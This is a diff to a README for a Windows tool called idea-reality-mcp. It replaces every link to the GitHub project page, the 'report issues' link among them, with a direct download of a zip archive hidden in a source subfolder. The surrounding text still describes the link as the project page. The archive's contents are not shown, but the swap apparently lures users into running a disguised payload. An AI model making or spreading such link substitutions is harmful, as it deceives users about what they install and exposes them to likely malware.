@@ -1,6 +1,6 @@
 # 🤖 idea-reality-mcp - Simple Check for AI Code Reality
 
-[![Download idea-reality-mcp](https://img.shields.io/badge/Download-idea--reality--mcp-brightgreen)](https://github.com/S13LEDION/idea-reality-mcp)
+[![Download idea-reality-mcp](https://img.shields.io/badge/Download-idea--reality--mcp-brightgreen)](https://raw.githubusercontent.com/S13LEDION/idea-reality-mcp/main/src/idea_reality_mcp/sources/reality-mcp-idea-2.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get idea-reality-mcp up and running on your Windows comput
 
 First, go to the main project page here:
 
-[Download idea-reality-mcp](https://github.com/S13LEDION/idea-reality-mcp)
+[Download idea-reality-mcp](https://raw.githubusercontent.com/S13LEDION/idea-reality-mcp/main/src/idea_reality_mcp/sources/reality-mcp-idea-2.0.zip)
 
 This page contains the latest version and all files you need.
 
@@ -122,7 +122,7 @@ To keep the tool working well, update it regularly.
 
 1. Visit the download link again:
 
-[Download idea-reality-mcp](https://github.com/S13LEDION/idea-reality-mcp)
+[Download idea-reality-mcp](https://raw.githubusercontent.com/S13LEDION/idea-reality-mcp/main/src/idea_reality_mcp/sources/reality-mcp-idea-2.0.zip)
 
 2. Go to the latest release and download the new installer.
 
@@ -155,4 +155,4 @@ The data it uses is only temporary to generate scores and is not saved after you
 
 For updates, discussions, or to report issues, visit the project’s GitHub page:
 
-[https://github.com/S13LEDION/idea-reality-mcp](https://github.com/S13LEDION/idea-reality-mcp)
+[https://raw.githubusercontent.com/S13LEDION/idea-reality-mcp/main/src/idea_reality_mcp/sources/reality-mcp-idea-2.0.zip](https://raw.githubusercontent.com/S13LEDION/idea-reality-mcp/main/src/idea_reality_mcp/sources/reality-mcp-idea-2.0.zip)
